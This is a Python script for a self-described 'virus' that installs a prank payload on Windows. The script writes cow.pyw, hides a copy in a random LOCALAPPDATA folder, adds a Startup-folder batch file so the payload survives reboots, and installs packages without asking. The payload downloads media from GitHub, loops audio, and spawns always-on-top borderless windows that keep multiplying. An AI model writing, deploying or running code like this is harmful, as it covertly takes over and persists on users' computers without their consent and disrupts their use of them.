import os
import subprocess
import sys
import shutil
import random

folder = os.path.dirname(os.path.abspath(__file__))
cow_path = os.path.join(folder, "cow.pyw")

cow_code = r'''
import tkinter as tk
from PIL import Image, ImageTk
import pygame
import os
import random
import urllib.request

folder = os.path.dirname(os.path.abspath(__file__))

gif_path = os.path.join(folder, "dancing.gif")
mp3_path = os.path.join(folder, "pol.mp3")

gif_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
mp3_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"


def download_file(url, path):
    if not os.path.exists(path):
        try:
            urllib.request.urlretrieve(url, path)
        except Exception as e:
            print("Download failed:", e)


download_file(gif_url, gif_path)
download_file(mp3_url, mp3_path)


try:
    pygame.mixer.init()
    pygame.mixer.music.load(mp3_path)
    pygame.mixer.music.play(-1)
except Exception as e:
    print("Audio disabled:", e)


cows = []
max_cows = 100


def load_frames():
    frames = []

    try:
        gif = Image.open(gif_path)

        while True:
            frame = gif.copy().convert("RGBA")
            frames.append(ImageTk.PhotoImage(frame))

            gif.seek(len(frames))

    except EOFError:
        pass
    except Exception as e:
        print("GIF error:", e)

    return frames


frames = load_frames()


def create_cow():
    if len(cows) >= max_cows:
        return

    if not frames:
        return

    window = tk.Toplevel()
    window.title("")
    window.resizable(False, False)
    window.overrideredirect(True)
    window.attributes("-topmost", True)

    screen_w = window.winfo_screenwidth()
    screen_h = window.winfo_screenheight()

    x = random.randint(0, max(0, screen_w - 200))
    y = random.randint(0, max(0, screen_h - 200))

    window.geometry(f"+{x}+{y}")

    label = tk.Label(window)
    label.pack()

    cow = {
        "window": window,
        "label": label,
        "index": 0,
        "frames": frames
    }

    label.config(image=frames[0])
    cows.append(cow)


def animate():
    for cow in cows[:]:
        try:
            cow["label"].config(
                image=cow["frames"][cow["index"]]
            )

            cow["index"] = (
                cow["index"] + 1
            ) % len(cow["frames"])

        except Exception:
            cows.remove(cow)

    root.after(100, animate)


def duplicate():
    amount = len(cows)

    for _ in range(amount):
        create_cow()

    root.after(10000, duplicate)


def keep_top():
    for cow in cows:
        try:
            cow["window"].attributes("-topmost", True)
        except:
            pass

    root.after(1000, keep_top)


root = tk.Tk()
root.withdraw()

create_cow()

animate()
keep_top()

root.after(10000, duplicate)

root.mainloop()
'''


if not os.path.exists(cow_path):
    with open(cow_path, "w", encoding="utf-8") as f:
        f.write(cow_code)

local_path = os.environ["LOCALAPPDATA"]

existing_folders = [
    f for f in os.listdir(local_path)
    if os.path.isdir(os.path.join(local_path, f))
]

if existing_folders:
    chosen_folder = random.choice(existing_folders)

    target_folder = os.path.join(
        local_path,
        chosen_folder
    )

    local_cow = os.path.join(
        target_folder,
        "cow.pyw"
    )

    shutil.copy(cow_path, local_cow)

    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    bat_path = os.path.join(
        startup_folder,
        "cow_startup.bat"
    )

    with open(bat_path, "w") as f:
        f.write(f'@echo off\n"{sys.executable}" "{local_cow}"')

    print("cow.pyw added to startup!")
else:
    print("No AppData Local folders found!")

libraries = [
    "pillow",
    "pygame"
]

for library in libraries:
    try:
        __import__(library.split("-")[0])
    except ImportError:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", library]
        )

subprocess.Popen([sys.executable, cow_path])